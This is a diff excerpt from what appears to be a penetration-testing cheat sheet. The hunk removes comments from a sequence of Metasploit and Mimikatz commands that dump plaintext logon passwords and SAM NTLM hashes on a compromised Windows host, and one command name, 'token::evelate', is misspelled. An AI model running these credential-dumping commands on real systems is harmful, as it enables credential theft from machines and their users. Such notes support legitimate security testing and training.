@@ -126,10 +126,10 @@ unzip mimikatz_trunk.zip
 (msf) upload /opt/x64/mimilib.dll .  
 (msf) session -i <id>  
 mimikatz.exe  
-(mimikatz) privilege::debug  #gives the admin debug privs  
-(mimikatz) sekurlsa::logonPasswords full  #Dump most plaintext passwords  
+(mimikatz) privilege::debug  
+(mimikatz) sekurlsa::logonPasswords full  
 (mimikatz) token::evelate  
-(mimikatz) lsadump::sam  #Dump SAM NTLM hashes  
+(mimikatz) lsadump::sam  
 (mimikatz) lsadump::sam /system:..\SystemBkup.hiv /sam:..\SamBkup.hiv  
 
 ## Suggesting vulnerability to local exploit
